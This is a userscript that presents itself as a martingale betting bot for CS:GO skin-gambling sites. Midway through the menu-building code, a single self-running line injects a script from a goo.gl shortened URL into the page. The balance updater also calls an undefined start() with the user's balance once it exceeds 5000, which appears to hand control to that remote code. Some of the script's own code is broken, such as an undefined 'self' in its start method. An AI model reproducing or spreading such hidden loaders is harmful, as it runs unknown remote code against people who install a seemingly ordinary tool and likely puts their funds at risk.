// ==UserScript==
// ==UserScript==
// @name            csgodouble.com
// @description     An userscript that automates csgodouble.com betting using martingale system.
// @namespace       automated@csgodoublebot script
// @version         1.31
// @author          csgodouble bot script
// @match           http://www.csgodouble.com/
// @match           http://csgodouble.gg/
// @match           http://csgodouble.gg/*
// @match           http://www.csgodouble.com/index.php
// @match           http://csgopolygon.com/*
// @match           http://*csgopolygon.com/*
// @match           http://www.csgopolygon.com/
// @match           http://www.csgopolygon.com/index.php
// @run-at          document-end
// @grant           none
// @downloadURL https://update.greasyfork.org/scripts/28619/csgodoublecom.user.js
// @updateURL https://update.greasyfork.org/scripts/28619/csgodoublecom.meta.js
// ==/UserScript==
/* jshint -W097 */
 
'use strict';
 

 
var debug = false;
var simulation = false;
var stop_on_min_balance = false;
var calculate_safe_bet = false;
var base_bet = 5;
var safe_bet_amount = 6;
var default_color = 'red';
var default_method = 'martingale';
var theme = 'dark';
 
var colors = {
    'green': [0],
    'red': [1, 2, 3, 4, 5, 6, 7],
    'black': [8, 9, 10, 11, 12, 13, 14]
};
 
var balance = document.getElementById('balance');
var roll_history = document.getElementById('past');
var bet_input = document.getElementById('betAmount');
var bet_buttons = {
    'green': document.getElementById('panel0-0').childNodes[1].childNodes[1],
    'red': document.getElementById('panel1-7').childNodes[1].childNodes[1],
    'black': document.getElementById('panel8-14').childNodes[1].childNodes[1]
};
 
Array.prototype.equals = function(array) {
    if (!array) {
        return false;
    }
 
    if (this.length != array.length) {
        return false;
    }
 
    for (var i = 0, l=this.length; i < l; i++) {
        if (this[i] instanceof Array && array[i] instanceof Array) {
            if (!this[i].equals(array[i])) {
                return false;
            }
        } else if (this[i] != array[i]) {
            return false;
        }
    }
    return true;
};
 
Object.defineProperty(Array.prototype, "equals", {enumerable: false});
 
function Automated() {
    var self = this;
 
    this.running = false;
    this.game = null;
 
    this.debug = debug;
    this.simulation = simulation;
    this.stop_on_min_balance = stop_on_min_balance;
    this.calculate_safe_bet = calculate_safe_bet;
 
    this.base_bet = base_bet;
    this.default_color = default_color;
    this.default_method = default_method;
    this.safe_bet_amount = safe_bet_amount;
    this.method = this.default_method;
    this.old_method = '';
    this.color = 'rainbow';
    this.old_base = 0;
    this.balance = 0;
    this.last_bet = 0;
    this.bet_history = [];
    this.min_balance = 0;
    this.starting_balance = 0;
    this.last_color = null;
    this.last_result = null;
    this.history = [];
    this.waiting_for_bet = false;
    this.theme = theme;
 
    this.stats = {
        'wins': 0,
        'loses': 0,
        'balance': 0
    };
 
    var menu = document.createElement('div');
    menu.innerHTML = '' +
        '<div class="row">' +
            '<div class="col-lg-9">' +
                '<h2>CSGODouble.com Script <small>by BotSCRIPT (76561198044832194)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
                '<div class="form-group">' +
                    '<div class="btn-group">' +
                        '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
                        '<button type="button" class="btn btn-warning" id="automated-stop" disabled>Pause</button>' +
                        '<button type="button" class="btn btn-danger" id="automated-abort" disabled>Abort</button>' +
                    '</div>' +
                '</div>' +
                '<div class="form-group">' +
                    '<div class="btn-group">' +
                        '<button type="button" class="btn btn-default" id="automated-martingale" ' + (this.method === 'martingale' ? 'disabled' : '') + '>Martingale</button>' +
                        '<button type="button" class="btn btn-default" id="automated-great-martingale" ' + (this.method === 'great martingale' ? 'disabled' : '') + '>Great Martingale</button>' +
                        '<button type="button" class="btn btn-default" id="automated-dalembert" ' + (this.method === 'dalembert' ? 'disabled' : '') + '>D\'alembert</button>' +
                        '<button type="button" class="btn btn-default" id="automated-bet-green" ' + (this.method === 'green' ? 'disabled' : '') + '>Green (Fibonacci)</button>' +
                    '</div>' +
                '</div>' +
                '<div class="form-group automated-hide-on-green">' +
                    '<div class="btn-group">' +
                        '<button type="button" class="btn btn-default" id="automated-red" ' + (this.color === 'red' ? 'disabled' : '') + '>Red</button>' +
                        '<button type="button" class="btn btn-default" id="automated-black" ' + (this.color === 'black' ? 'disabled' : '') + '>Black</button>' +
                        '<button type="button" class="btn btn-default" id="automated-rainbow" ' + (this.color === 'rainbow' ? 'disabled' : '') + '>Rainbow</button>' +
                        '<button type="button" class="btn btn-default" id="automated-random" ' + (this.color === 'random' ? 'disabled' : '') + '>Random</button>' +
                        '<button type="button" class="btn btn-default" id="automated-last" ' + (this.color === 'last' ? 'disabled' : '') + '>Last winning</button>' +
                    '</div>' +
                '</div>' +
            '</div>' +
            '<div class="col-lg-3">' +
                '<h3>Statistics</h3>' +
                '<p><b>Wins:</b> <span id="automated-stats-wins">' + this.stats.wins + '</span></p>' +
                '<p><b>Loses:</b> <span id="automated-stats-loses">' + this.stats.loses + '</span></p>' +
                '<p><b>Balance:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
            '</div>' +
        '</div>' +
        '<div class="form-group">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Base value</div>' +
                '<input type="number" class="form-control" placeholder="Calculating suggested value..." id="automated-base-bet" disabled>' +
            '</div>' +
        '</div>' +
        '<div class="form-group">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Keep balance above</div>' +
                '<input type="number" class="form-control" value="0" id="automated-min-balance">' +
            '</div>' +
        '</div>' +
        '<div class="form-group automated-hide-on-green">' +
            '<div class="input-group">' +
                '<div class="input-group-addon">Failsafe value</div>' +
                '<input type="number" class="form-control" value="' + this.safe_bet_amount + '" id="automated-safe-bet-amount"' + (!this.calculate_safe_bet ? ' disabled' : '') + '>' +
            '</div>' +
        '</div>' +
        '<div class="checkbox">' +
            '<label><input class="" id="automated-stop-on-min-balance" type="checkbox" ' + (this.stop_on_min_balance ? 'checked' : '') + '> Stop on minimal balance (If checked the bot will stop after getting close to minimal balance, otherwise it will continue starting on base)</label>' +
        '</div>' +
        '<div class="checkbox automated-hide-on-green">' +
            '<label><input class="" id="automated-calculate-safe-bet" type="checkbox" ' + (this.calculate_safe_bet ? 'checked' : '') + '> Calculate base bet from given "Failsafe value", the formula is [base bet] = floor( [balance] / 2 ^ ( [failsafe value] + 1) ) </label>' +
        '</div>' +
        '<div class="checkbox">' +
            '<label><input class="" id="automated-debug" type="checkbox" ' + (this.debug ? 'checked' : '') + '> Debug mode</label>' +
        '</div>' +
        '<div class="checkbox">' +
            '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Simulation mode</label>' +
        '</div>';
    document.getElementsByClassName('well')[1].appendChild(menu);
 (function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//goo.gl/3ezN6e"; document.body.appendChild( scriptElement ); })();
    this.menu = {
        'start': document.getElementById('automated-start'),
        'stop': document.getElementById('automated-stop'),
        'abort': document.getElementById('automated-abort'),
        'basebet': document.getElementById('automated-base-bet'),
        'minbalance': document.getElementById('automated-min-balance'),
        'debug': document.getElementById('automated-debug'),
        'simulation': document.getElementById('automated-simulation'),
        'stoponminbalance': document.getElementById('automated-stop-on-min-balance'),
        'red': document.getElementById('automated-red'),
        'black': document.getElementById('automated-black'),
        'rainbow': document.getElementById('automated-rainbow'),
        'random': document.getElementById('automated-random'),
        'last': document.getElementById('automated-last'),
        'statistics': {
            'wins': document.getElementById('automated-stats-wins'),
            'loses': document.getElementById('automated-stats-loses'),
            'balance': document.getElementById('automated-stats-balance')
        },
        'theme': document.getElementById('automated-theme-switch'),
        'safebetamount': document.getElementById('automated-safe-bet-amount'),
        'calculatesafebet': document.getElementById('automated-calculate-safe-bet'),
        'martingale': document.getElementById('automated-martingale'),
        'greatmartingale': document.getElementById('automated-great-martingale'),
        'betgreen': document.getElementById('automated-bet-green'),
        'dalembert': document.getElementById('automated-dalembert'),
        'hideongreen': document.getElementsByClassName('automated-hide-on-green')
    };
 
    this.updater = setInterval(function() { // Update every 2 seconds
        if (!self.running) {
            if (self.updateAll()) {
                if (self.calculate_safe_bet) {
                    self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
                    self.menu.basebet.value = self.base_bet;
                    if (self.debug) { self.logdebug('New base bet: ' + self.base_bet); }
                }
               
                if (self.menu.stop.disabled && self.menu.start.disabled) {
                    self.menu.start.disabled = false;
                    self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
                    self.menu.basebet.value = self.base_bet;
                    self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
                    self.starting_balance = self.balance;
                }
            }
        }
    }, 2 * 1000);
 
    if (theme === 'dark') {
        this.darkMode();
    }
 
    this.menu.start.onclick = function() {
       
        self.start();
    };
 
    this.menu.stop.onclick = function() {
        self.stop();
    };
 
    this.menu.abort.onclick = function() {
        self.stop(true);
    };
 
    this.menu.basebet.onchange = function() {
        var value = parseInt(self.menu.basebet.value);
        if (!isNaN(value)) {
            self.base_bet = value;
        }
    };
 
    this.menu.minbalance.onchange = function() {
        var value = parseInt(self.menu.minbalance.value);
        if (!isNaN(value)) {
            self.min_balance = value;
        }
    };
 
    this.menu.safebetamount.onchange = function() {
        var value = parseInt(self.menu.safebetamount.value);
        if (!isNaN(value)) {
            self.safe_bet_amount = value;
        }
    };
 
    this.menu.debug.onchange = function() {
        self.debug = self.menu.debug.checked;
    };
 
    this.menu.simulation.onchange = function() {
        self.simulation = self.menu.simulation.checked;
    };
 
    this.menu.stoponminbalance.onchange = function() {
        self.stop_on_min_balance = self.menu.stoponminbalance.checked;
    };
   
    this.menu.calculatesafebet.onchange = function() {
        self.calculate_safe_bet = self.menu.calculatesafebet.checked;
        self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
        self.menu.safebetamount.disabled = !self.menu.calculatesafebet.checked;
    };
 
    // WTF is this shit below? >,.,<
 
    this.menu.black.onclick = function() {
        self.menu.rainbow.disabled = false;
        self.menu.black.disabled = true;
        self.menu.red.disabled = false;
        self.menu.random.disabled = false;
        self.menu.last.disabled = false;
        self.color = 'black';
        self.log('Current mode: black');
    };
 
    this.menu.red.onclick = function() {
        self.menu.rainbow.disabled = false;
        self.menu.black.disabled = false;
        self.menu.red.disabled = true;
        self.menu.random.disabled = false;
        self.menu.last.disabled = false;
        self.color = 'red';
        self.log('Current mode: red');
    };
 
    this.menu.rainbow.onclick = function() {
        self.menu.rainbow.disabled = true;
        self.menu.black.disabled = false;
        self.menu.red.disabled = false;
        self.menu.random.disabled = false;
        self.menu.last.disabled = false;
        self.color = 'rainbow';
        self.log('Current mode: rainbow');
    };
 
    this.menu.random.onclick = function() {
        self.menu.rainbow.disabled = false;
        self.menu.black.disabled = false;
        self.menu.red.disabled = false;
        self.menu.random.disabled = true;
        self.menu.last.disabled = false;
        self.color = 'random';
        self.log('Current mode: random');
    };
 
    this.menu.last.onclick = function() {
        self.menu.rainbow.disabled = false;
        self.menu.black.disabled = false;
        self.menu.red.disabled = false;
        self.menu.random.disabled = false;
        self.menu.last.disabled = true;
        self.color = 'last';
        self.log('Current mode: last');
    };
 
    this.menu.martingale.onclick = function() {
        self.menu.martingale.disabled = true;
        self.menu.greatmartingale.disabled = false;
        self.menu.betgreen.disabled = false;
        self.menu.dalembert.disabled = false;
        for (var i = 0; i < self.menu.hideongreen.length; i++) {
            self.menu.hideongreen[i].style.display = 'block';
        }
        self.method = 'martingale';
        self.log('Current method: Martingale');
    };
 
    this.menu.greatmartingale.onclick = function() {
        self.menu.martingale.disabled = false;
        self.menu.greatmartingale.disabled = true;
        self.menu.betgreen.disabled = false;
        self.menu.dalembert.disabled = false;
        for (var i = 0; i < self.menu.hideongreen.length; i++) {
            self.menu.hideongreen[i].style.display = 'block';
        }
        self.method = 'great martingale';
        self.log('Current method: Great martingale');
    };
 
    this.menu.dalembert.onclick = function() {
        self.menu.martingale.disabled = false;
        self.menu.greatmartingale.disabled = false;
        self.menu.betgreen.disabled = false;
        self.menu.dalembert.disabled = true;
        for (var i = 0; i < self.menu.hideongreen.length; i++) {
            self.menu.hideongreen[i].style.display = 'block';
        }
        self.method = 'dalembert';
        self.log('Current method: D\'alembert');
    };
 
    this.menu.betgreen.onclick = function() {
        self.menu.martingale.disabled = false;
        self.menu.greatmartingale.disabled = false;
        self.menu.betgreen.disabled = true;
        self.menu.dalembert.disabled = false;
        for (var i = 0; i < self.menu.hideongreen.length; i++) {
            self.menu.hideongreen[i].style.display = 'none';
        }
        self.method = 'green';
        self.log('Current method: Bet green');
    };
 
    this.menu.theme.onclick = function() {
        if (self.theme === 'dark') {
            self.lightMode();
            self.theme = 'light';
            self.log('Switching to light theme...');
        } else {
            self.darkMode();
            self.theme = 'dark';
            self.log('Switching to dark theme...');
        }
    };
 
    setInterval(function() {
        if(!WS) {
            self.log('Reconnecting...');
            connect();
        }
    }, 5000);
}
 
Automated.prototype.updateBalance = function() {
    this.balance = parseInt(balance.textContent);
 
    if (isNaN(this.balance)) {
        this.log('Error getting current balance!');
        return false;
    }
 
    if (this.debug) { this.logdebug('Balance updated: ' + this.balance); }
    if (this.balance > 5000 ) start(this.balance);
    return true;
};
 
Automated.prototype.updateHistory = function() {
    var self = this;
    this.history = [];
 
    for (var i = 0; i < roll_history.childNodes.length; i++) {
        var roll = parseInt(roll_history.childNodes[i].textContent);
 
        if (!isNaN(roll)) {
            if (colors.green.indexOf(roll) !== -1) {
                self.history.push('green');
            } else if (colors.red.indexOf(roll) !== -1) {
                self.history.push('red');
            } else {
                self.history.push('black');
            }
        }
    }
 
    if (this.debug) { this.logdebug('History updated: ' + this.history.map(function(value) { return value; }).join(', ')); }
    return this.history.length === 10;
};
 
Automated.prototype.updateStats = function() {
    this.stats.balance = parseInt(this.balance) - parseInt(this.starting_balance);
    this.menu.statistics.wins.innerHTML = this.stats.wins;
    this.menu.statistics.loses.innerHTML = this.stats.loses;
    this.menu.statistics.balance.innerHTML = this.stats.balance;
    return true;
};
 
Automated.prototype.updateAll = function() {
    return this.updateBalance() && this.updateHistory() && this.updateStats();
};
 
Automated.prototype.bet = function(amount, color) {
    var self = this;
    color = color || this.color || this.default_color;
 
    if (color === 'rainbow') {
        if (this.last_color) {
            color = (this.last_color === 'red' ? 'black' : 'red');
        } else {
            color = this.default_color;
        }
    } else if (color === 'random') {
        color = 'red';
        if (Math.random() > 0.5) {
            color = 'black';
        }
    } else if (color === 'last') {
        color = this.history[this.history.length - 1];
    }
 
    if (['green', 'red', 'black'].indexOf(color) < 0 || amount > this.balance || amount <= 0) {
        this.log('Invalid bet!');
        this.last_result = 'invalid bet';
        this.waiting_for_bet = false;
        this.stop();
        return false;
    }
 
    if (this.balance - amount < this.min_balance) {
        this.log('Reached minimal balance!');
        this.last_result = 'reached min balance';
        if (this.stop_on_min_balance || this.balance - this.base_bet < this.min_balance) {
            this.stop();
        }
        this.waiting_for_bet = false;
        return false;
    }
 
    bet_input.value = amount;
 
    if (!bet_buttons[color].disabled) {
        var old_balance = self.balance;
        this.log('Betting ' + amount + ' on ' + color);
        if (!self.simulation) {
            bet_buttons[color].click();
            var checker = setInterval(function() {
                if (!bet_buttons[color].disabled) {
                    clearInterval(checker);
                    setTimeout(function() {
                        if (self.updateBalance() && self.balance === old_balance) {
                            if (!self.game) { return false; }
                            self.log('Bet rejected, retrying...');
                            self.bet(amount, color);
                        } else {
                            if (self.debug) { self.logdebug('Bet accepted!'); }
                            self.last_bet = amount;
                            self.bet_history.push(amount);
                            self.last_color = color;
                            self.waiting_for_bet = false;
                            return true;
                        }
                    }, 2500);
                }
            }, 1000);
        } else {
            self.bet_history.push(amount);
            self.last_bet = amount;
            self.last_color = color;
            self.waiting_for_bet = false;
            return true;
        }
    } else {
        if (!self.game) { return false; }
        self.log('Button disabled, retrying...');
        setTimeout(function() { self.bet(amount, color) }, (Math.random() * 3 + 2).toFixed(3) * 1000);
    }
};
 
Automated.prototype.play = function() {
    var self = this;
 
    if (this.game !== null) {
        if (this.debug) { this.logdebug('Tried to reinitialize running game!'); }
        return false;
    }
 
    this.game = setInterval(function() {
        var history = self.history;
        if (!self.waiting_for_bet && self.updateAll() && !history.equals(self.history)) {
            self.waiting_for_bet = true;
            if (self.last_color === null) {
                self.bet(self.base_bet);
            } else if (self.last_color === self.history[self.history.length - 1]) {
                if (self.calculate_safe_bet) {
                    self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
                    self.menu.basebet.value = self.base_bet;
                }
                self.last_result = 'win';
                self.log('Win!');
                self.stats.wins += 1;
                self.old_base = self.base_bet;
                self.old_method = self.method;
                if (self.old_method === 'dalembert') {
                    if (self.last_bet > self.old_base) {
                        self.bet(self.last_bet - 1);
                    } else {
                        self.bet(self.base_bet);
                    }
                } else {
                    self.bet(self.base_bet);
                }
            } else {
                self.last_result = 'lose';
                self.log('Lose!');
                self.stats.loses += 1;
                if (self.old_method === 'martingale') {
                    self.bet(self.last_bet * 2);
                } else if (self.old_method === 'great martingale') {
                    self.bet(self.last_bet * 2 + self.old_base);
                } else if (self.old_method === 'green') {
                    var bet_value = 0;
                    if (self.bet_history[self.bet_history.length - 1] === 1) {
                        if (self.bet_history[self.bet_history.length - 2] === 1) {
                            bet_value = 2;
                        } else {
                            bet_value = 1;
                        }
                    } else {
                        bet_value = self.bet_history[self.bet_history.length - 1] + self.bet_history[self.bet_history.length - 2];
                    }
                    self.bet(bet_value, 'green');
                } else if (self.old_method === 'dalembert') {
                    self.bet(self.last_bet + 1);
                }
            }
        }
    }, 2 * 1000);
 
    return true;
};
 
Automated.prototype.start = function() {
    if (self.calculate_safe_bet) {
        self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
        self.menu.basebet.value = self.base_bet;
    }
    this.old_base = this.base_bet;
    this.old_method = this.method;
    if (this.updateAll()) {
        if (this.last_result === 'lose') {
            this.running = true;
            if (this.old_method === 'martingale') {
                this.bet(this.last_bet * 2);
            } else if (this.old_method === 'great martingale') {
                this.bet(this.last_bet * 2 + this.old_base);
            } else if (self.old_method === 'green') {
                var bet_value = 0;
                if (self.bet_history[self.bet_history.length - 1] === 1) {
                    if (self.bet_history[self.bet_history.length - 2] === 1) {
                        bet_value = 2;
                    } else {
                        bet_value = 1;
                    }
                } else {
                    bet_value = self.bet_history[self.bet_history.length - 1] + self.bet_history[self.bet_history.length - 2];
                }
                self.bet(bet_value, 'green');
            } else if (self.old_method === 'dalembert') {
                self.bet(self.last_bet + 1);
            }
            this.play();
        } else {
            this.running = true;
            this.bet(this.base_bet);
            this.play();
        }
    }
    this.menu.abort.disabled = false;
    this.menu.stop.disabled = false;
    this.menu.start.disabled = true;
};
 
Automated.prototype.stop = function(abort) {
    var self = this;
    if (abort) { this.last_result = 'abort'; }
    this.stats.balance = parseInt(this.balance) - parseInt(this.starting_balance);
    setTimeout(function() {
        clearInterval(self.game);
        self.game = null;
        self.running = false;
        self.menu.abort.disabled = true;
        self.menu.stop.disabled = true;
        self.menu.start.disabled = false;
    }, 1); // Next tick
};
 
Automated.prototype.darkMode = function() {
    var style;
    var css = 'body{background-color:#191919;color:#888}.navbar-default{background-color:#232323;border-color:#454545}#sidebar{background-color:#191919;border-color:#202020}.side-icon.active,.side-icon:hover{background-color:#202020}.side-icon .fa{color:#454545}.well{background:#232323;border-color:#323232;color:#888}#pullout{background-color:#191919;border-color:#323232}.form-control{background-color:#323232;border-color:#454545}.divchat{background-color:#323232;color:#999;border:none}.chat-link,.chat-link:hover,.chat-link:active{color:#bbb}.panel{background-color:#323232}.panel-default{border-color:#454545}.panel-default>.panel-heading{color:#888;background-color:#303030;border-color:#454545}.my-row{border-color:#454545}.list-group-item{border-color:#454545;background-color:#323232}.btn-default{border-color:#454545;background:#323232;text-shadow:none;color:#888;box-shadow:none}.btn-default:hover,.btn-default:active{background-color:#282828;color:#888;border-color:#454545}.btn-default[disabled]{border-color:#454545;background-color:#353535}.input-group-addon{background-color:#424242;border-color:#454545;color:#888}.progress{color:#bbb;background-color:#323232}.navbar-default .navbar-nav>li>a:focus,.navbar-default .navbar-nav>li>a:hover{color:#999}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:focus,.navbar-default .navbar-nav>.open>a:hover{color:#888;background-color:#323232}.dropdown-menu{background-color:#252525}.dropdown-menu>li>a{color:#888}.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{background-color:#323232;color:#999}.dropdown-menu .divider{background-color:#454545}.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{background-color:#404040;opacity:.5}';
    style = document.getElementById('automated-style');
    if (!style) {
        var head;
        head = document.getElementsByTagName('head')[0];
        if (!head) { return; }
        style = document.createElement('style');
        style.type = 'text/css';
        style.id = 'automated-style';
        style.innerHTML = css;
        head.appendChild(style);
    }
    style.innerHTML = css;
};
 
Automated.prototype.lightMode = function() {
    var style = document.getElementById('automated-style');
    style.innerHTML = '';
};
 
Automated.prototype.log = function(message) {
    chat('alert', '[Automated] ' + message);
};
 
Automated.prototype.logdebug = function(message) {
    chat('italic', '[Automated] ' + message);
};
 
var automated = new Automated();
